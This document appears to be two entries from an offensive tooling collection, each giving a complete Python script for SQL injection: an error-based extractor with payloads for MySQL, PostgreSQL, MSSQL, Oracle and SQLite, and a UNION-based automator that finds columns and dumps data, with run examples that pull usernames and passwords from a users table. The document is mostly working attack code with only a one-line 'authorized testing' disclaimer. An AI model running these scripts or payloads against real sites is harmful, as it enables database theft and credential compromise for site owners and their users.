entries.title: Error-based SQLi extractor (multi-DBMS)
entries.body:
Squeezes data **out of the DBMS error text** in a single request: we feed in an expression the DBMS cannot evaluate, and the value you want comes back inside the error message. The fastest way to dump when the application returns SQL errors in the response (or at least part of them). Use it instead of blind when errors are visible - an order of magnitude faster.

> Important: in MySQL `extractvalue`/`updatexml` truncate the output to roughly **32 characters**. Pull long values in chunks via `SUBSTRING(({q}),1,32)`, then `,33,32` and so on (the `--chunk` flag). Oracle `ctxsys.drithsx.sn` is niche and often unavailable - the main path there is via `XMLType`.

```python
#!/usr/bin/env python3
# sqli_error_based.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, re, requests
requests.packages.urllib3.disable_warnings()

# {q} = a subquery returning ONE row (wrap it in parens/LIMIT 1 yourself)
PAYLOADS = {
    "mysql": [
        "AND extractvalue(1,concat(0x7e,({q}),0x7e))",
        "AND updatexml(1,concat(0x7e,({q}),0x7e),1)",
        "AND (SELECT 1 FROM(SELECT count(*),concat(({q}),0x7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)",
    ],
    "postgres": [
        "AND 1=cast(({q}) as int)",
        "AND 1=(SELECT ({q}))::int",
    ],
    "mssql": [
        "AND 1=convert(int,({q}))",
        "AND 1=({q})",
    ],
    "oracle": [
        "AND 1=(SELECT upper(XMLType(chr(60)||chr(58)||(({q}))||chr(62))) FROM dual)",
        "AND 1=ctxsys.drithsx.sn(1,({q}))",
    ],
    "sqlite": [
        "AND 1=load_extension(({q}))",
        "AND ({q}) AND 1=abs(-9223372036854775808)",
    ],
}
# how we pull a slice of the string (MySQL/MSSQL = SUBSTRING, the rest = SUBSTR)
SUBSTR = {"mysql": "SUBSTRING", "mssql": "SUBSTRING", "postgres": "SUBSTR", "oracle": "SUBSTR", "sqlite": "SUBSTR"}

def send(s, url, payload, where, cookie):
    full = url.replace("*", payload) if "*" in url else url
    ck = dict(c.split("=", 1) for c in cookie.split(";") if "=" in c) if cookie else None
    try:
        if where == "GET":
            r = s.get(full, cookies=ck, verify=False, timeout=30)
        else:
            r = s.post(url, data={where: payload}, cookies=ck, verify=False, timeout=30)
    except requests.RequestException:
        return ""
    return r.text

def parse(text):
    # we wrap the value in ~...~ markers (0x7e); extract what is between them
    m = re.search(r"~([^~]{0,200})~", text)
    if m:
        return m.group(1)
    # fallback: PG/MSSQL/Oracle print the value directly in the error text
    for pat in [r"invalid input syntax for [^:]*: \"([^\"]+)\"",
                r"Conversion failed when converting[^']*'([^']+)'",
                r"converting the (?:n?varchar|character) value '([^']+)'",
                r"ORA-\d+: ?<:([^>]+)>"]:
        m = re.search(pat, text)
        if m:
            return m.group(1)
    return None

def one_shot(s, a, q):
    for tpl in PAYLOADS[a.dbms]:
        pl = f"{a.prefix} {tpl.format(q=q)}{a.suffix}"
        val = parse(send(s, a.url, pl, a.where, a.cookie))
        if val:
            return val
    return None

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL error-based SQLi extractor")
    ap.add_argument("-u", "--url", required=True, help="URL with * at the injection point")
    ap.add_argument("--dbms", choices=list(PAYLOADS), default="mysql")
    ap.add_argument("-q", "--query", default="version()", help="SQL subquery to extract")
    ap.add_argument("--prefix", default="1'")
    ap.add_argument("--suffix", default="-- -")
    ap.add_argument("--where", default="GET", help="GET or a POST param name")
    ap.add_argument("-c", "--cookie", default="")
    ap.add_argument("--chunk", action="store_true", help="MySQL/Oracle: pull in 32-char chunks")
    a = ap.parse_args()
    s = requests.Session(); s.headers["User-Agent"] = "ARS3NAL-SQLi/1.0"
    print(f"[*] dbms={a.dbms}  query={a.query}")
    if not a.chunk:
        val = one_shot(s, a, a.query)
        print(f"[=] RESULT: {val!r}")
        return
    sub, out, off = SUBSTR[a.dbms], "", 1
    while True:
        piece = one_shot(s, a, f"{sub}(({a.query}),{off},32)")
        if not piece:
            break
        out += piece; print(f"    [+{off:03d}] {out}")
        if len(piece) < 32:
            break
        off += 32
    print(f"[=] RESULT: {out!r}")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 sqli_error_based.py -u "https://target/item?id=1*" --dbms mysql -q "(SELECT concat(user,0x3a,password) FROM users LIMIT 1)" --chunk
```

entries.title: UNION-based SQLi automation (multi-DBMS)
entries.body:
Full automation of a **UNION injection** in three steps: 1) an `ORDER BY` ramp finds the column count (when the page breaks, the column count has been exceeded); 2) a `UNION SELECT` with string markers finds which columns are actually printed in the response; 3) into a visible column we insert the dump using the DBMS-specific string concatenation. Use it when the injection reflects data on the page (there is visible output), not blind.

> String concatenation differs per DBMS: MySQL `group_concat`, PostgreSQL `string_agg`, MSSQL `STRING_AGG` (2017+), Oracle `LISTAGG`. The script substitutes the right one automatically. If the column is not a string - wrap the value in `CAST(... AS CHAR)` (for PG/Oracle - `::text` / `||''`).

```python
#!/usr/bin/env python3
# sqli_union_auto.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
import argparse, re, requests
requests.packages.urllib3.disable_warnings()

MARK = "ARS31"           # unique marker in the visible column
NULL = "NULL"
# placeholder "where to select from" for DBMSs that require FROM
DUAL = {"oracle": " FROM dual", "mysql": "", "postgres": "", "mssql": "", "sqlite": ""}

def agg(dbms, expr):
    if dbms == "mysql":    return f"group_concat({expr} SEPARATOR 0x0a)"
    if dbms == "postgres": return f"string_agg(({expr})::text,chr(10))"
    if dbms == "mssql":    return f"STRING_AGG(cast({expr} as nvarchar(max)),char(10))"
    if dbms == "oracle":   return f"LISTAGG({expr},chr(10)) WITHIN GROUP (ORDER BY 1)"
    return f"group_concat({expr})"  # sqlite

def send(s, url, payload, where, cookie):
    full = url.replace("*", payload) if "*" in url else url
    ck = dict(c.split("=", 1) for c in cookie.split(";") if "=" in c) if cookie else None
    try:
        if where == "GET":
            r = s.get(full, cookies=ck, verify=False, timeout=30)
        else:
            r = s.post(url, data={where: payload}, cookies=ck, verify=False, timeout=30)
    except requests.RequestException:
        class E: status_code, text = 0, ""
        return E()
    return r

def baseline_len(s, a):
    r = send(s, a.url, a.prefix, a.where, a.cookie)
    return len(r.text), r.status_code

def find_cols(s, a, base_len):
    # ORDER BY ramp: as long as the page does not break, the column exists
    n = 1
    while n <= a.maxcols:
        pl = f"{a.prefix} ORDER BY {n}{a.suffix}"
        r = send(s, a.url, pl, a.where, a.cookie)
        broke = r.status_code >= 500 or abs(len(r.text) - base_len) > base_len * 0.5
        if broke:
            return n - 1
        n += 1
    return a.maxcols

def find_visible(s, a, ncols):
    # put a text marker into each column in turn
    visible = []
    for i in range(ncols):
        cols = [f"'{MARK}'" if j == i else NULL for j in range(ncols)]
        pl = f"{a.prefix} UNION SELECT {','.join(cols)}{DUAL[a.dbms]}{a.suffix}"
        if MARK in send(s, a.url, pl, a.where, a.cookie).text:
            visible.append(i)
    return visible

def dump(s, a, ncols, slot, expr):
    payload_expr = agg(a.dbms, expr)
    cols = [f"concat('{MARK}',({payload_expr}),'{MARK}')" if j == slot else NULL for j in range(ncols)]
    if a.dbms in ("postgres", "oracle", "sqlite"):
        cols = [c.replace("concat(", "").replace(")", "", 1) if False else c for c in cols]
    pl = f"{a.prefix} UNION SELECT {','.join(cols)}{DUAL[a.dbms]}{a.suffix}"
    txt = send(s, a.url, pl, a.where, a.cookie).text
    m = re.search(re.escape(MARK) + r"(.*?)" + re.escape(MARK), txt, re.S)
    return m.group(1) if m else None

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL UNION-based SQLi automation")
    ap.add_argument("-u", "--url", required=True, help="URL with * at the injection point")
    ap.add_argument("--dbms", choices=["mysql", "postgres", "mssql", "oracle", "sqlite"], default="mysql")
    ap.add_argument("-q", "--query", default="version()", help="expression to dump (string)")
    ap.add_argument("--prefix", default="1'")
    ap.add_argument("--suffix", default="-- -")
    ap.add_argument("--where", default="GET")
    ap.add_argument("-c", "--cookie", default="")
    ap.add_argument("--maxcols", type=int, default=25)
    a = ap.parse_args()
    s = requests.Session(); s.headers["User-Agent"] = "ARS3NAL-SQLi/1.0"
    base_len, _ = baseline_len(s, a)
    ncols = find_cols(s, a, base_len)
    print(f"[*] columns = {ncols}")
    if ncols < 1:
        print("[!] ORDER BY ramp did not find the column count - check prefix/suffix"); return
    vis = find_visible(s, a, ncols)
    print(f"[*] visible columns (0-indexed) = {vis}")
    if not vis:
        print("[!] no visible columns for the string - the type may not be a string, wrap it in CAST"); return
    out = dump(s, a, ncols, vis[0], a.query)
    print(f"[=] DUMP:\n{out}")

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 sqli_union_auto.py -u "https://target/cat?id=1*" --dbms mysql -q "concat(user,0x3a,password) FROM users"
```
